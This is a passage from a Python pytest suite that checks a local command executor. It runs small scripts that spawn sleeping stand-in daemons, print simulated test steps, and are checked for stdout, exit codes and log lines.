            "print(f'REPORT: {sys.argv[1] if len(sys.argv) > 1 else \"none\"}')\n"
            "print('done')\n"
        )
        executor = LocalExecutor()
        log_path = tmp_path / "cd.log"
        cmd = f"cd {tmp_path} && python3 auto_robot.py {report_dir}"
        result = await executor.execute(cmd, {}, log_path, timeout=10, cwd=str(tmp_path))
        assert result.success
        assert "done" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0631", domain="server/executors", priority="P2")
    async def test_auto_robot_long_running_with_daemon(self, tmp_path):
        script = tmp_path / "long_run.py"
        script.write_text(
            "import subprocess, sys, time\n"
            "print('start to run auto-robot')\n"
            "print('Set project to: ebox')\n"
            "p = subprocess.Popen(['sleep', '120'])\n"
            "print(f'device_monitor PID: {p.pid}')\n"
            "print('device_monitor successfully')\n"
            "sys.stdout.flush()\n"
            "# ----- simulate 60s real test work -----\n"
            "for i in range(1, 6):\n"
            "    time.sleep(1)\n"
            "    print(f'test step {i}/5 passed')\n"
            "    sys.stdout.flush()\n"
            "print('All tests passed')\n"
        )
        executor = LocalExecutor()
        log_path = tmp_path / "long_run.log"
        env = {"TASKPPS_RUN_ID": "test_run", "TASKPPS_TASK_ID": "aosp"}
        result = await executor.execute(f"python3 {script}", env, log_path, timeout=30)
        assert result.success
        assert result.exit_code == 0
        assert "test step 1/5 passed" in result.stdout
        assert "test step 5/5 passed" in result.stdout
        assert "All tests passed" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0632", domain="server/executors", priority="P2")
    async def test_auto_robot_long_running_with_multiple_daemons(self, tmp_path):
        script = tmp_path / "multi_long.py"
        script.write_text(
            "import subprocess, sys, time\n"
            "print('start to run auto-robot')\n"
            "# ---- spawn 2 device_monitor daemons ----\n"
            "m1 = subprocess.Popen(['sleep', '120'])\n"
            "print(f'device_monitor unigine PID: {m1.pid}')\n"
            "m2 = subprocess.Popen(['sleep', '120'])\n"
            "print(f'device_monitor llm PID: {m2.pid}')\n"
            "print('device_monitor successfully')\n"
            "sys.stdout.flush()\n"
            "# ---- run AOSP test suite ----\n"
            "for i in range(1, 4):\n"
            "    time.sleep(1)\n"
            "    print(f'AOSP test {i}/3: PASS')\n"
            "    sys.stdout.flush()\n"
            "print('AOSP test suite complete')\n"
        )
        executor = LocalExecutor()
        log_path = tmp_path / "multi_long.log"
        env = {"TASKPPS_RUN_ID": "test_run", "TASKPPS_TASK_ID": "aosp"}
        result = await executor.execute(f"python3 {script}", env, log_path, timeout=30)
        assert result.success
        assert result.exit_code == 0
        assert "device_monitor unigine PID:" in result.stdout
        assert "device_monitor llm PID:" in result.stdout
        assert "device_monitor successfully" in result.stdout
        assert "AOSP test 1/3: PASS" in result.stdout
        assert "AOSP test 3/3: PASS" in result.stdout
        assert "AOSP test suite complete" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0633", domain="server/executors", priority="P1")
    async def test_auto_robot_realistic_output_matches_production(self, tmp_path):
        script = tmp_path / "real_prod.py"
        script.write_text(
            "import subprocess, sys, time\n"
            "print('start to run auto-robot')\n"
            "print('Set project to: ebox')\n"
            "print(f'arguments: {sys.argv[1:]}')\n"
            "m = subprocess.Popen(['sleep', '120'])\n"
            "print(f'[2026-06-04 21:47:52.882] device_monitor PID: {m.pid}')\n"
            "print('device_monitor successfully')\n"
            "sys.stdout.flush()\n"
            "# simulate real test execution\n"
            "for i in range(3):\n"
            "    time.sleep(1)\n"
            "    print(f'[2026-06-04 21:47:{53+i:02d}.000] test_case_{i}: PASS')\n"
            "    sys.stdout.flush()\n"
            "print('[2026-06-04 21:47:56.000] All 3 tests passed')\n"
        )
        executor = LocalExecutor()
        log_path = tmp_path / "real.log"
        env = {"TASKPPS_RUN_ID": "bddf5a89a207", "TASKPPS_TASK_ID": "aosp_task"}
        cmd = (
            f"python3 {script} -K off -d /home/auto/report/20260604_214751 "
            "--loglevel DEBUG --listener RetryFailed:3 -A suite/aosp.txt ebox"
        )
        result = await executor.execute(cmd, env, log_path, timeout=30, cwd=str(tmp_path))
        assert result.success
        assert result.exit_code == 0
        assert "start to run auto-robot" in result.stdout
        assert "Set project to: ebox" in result.stdout
        assert "device_monitor successfully" in result.stdout
        assert "All 3 tests passed" in result.stdout

    @pytest.mark.asyncio
    @pytest.mark.zentao("TC-S0634", domain="server/executors", priority="P1")
    async def test_debug_logs_present_for_production_scenario(self, tmp_path):
        script = tmp_path / "prod.py"
        script.write_text(
            "import subprocess, time\n"
            "print('start to run auto-robot')\n"
            "p = subprocess.Popen(['sleep', '60'])\n"
            "print(f'device_monitor PID: {p.pid}')\n"
            "print('device_monitor successfully')\n"
            "time.sleep(0.5)\n"
        )
        executor = LocalExecutor()
        log_path = tmp_path / "prod.log"
        env = {"TASKPPS_RUN_ID": "test_run", "TASKPPS_TASK_ID": "aosp"}
        result = await executor.execute(f"python3 {script}", env, log_path, timeout=15)
        assert result.success
        log_content = log_path.read_text()
        assert "[VERSION] executor=v4-direct" in log_content
        assert "[INFO] Process started, PID:" in log_content
        assert "[INFO] Exit code: 0" in log_content
        assert "start to run auto-robot" in log_content
        assert "device_monitor successfully" in log_content

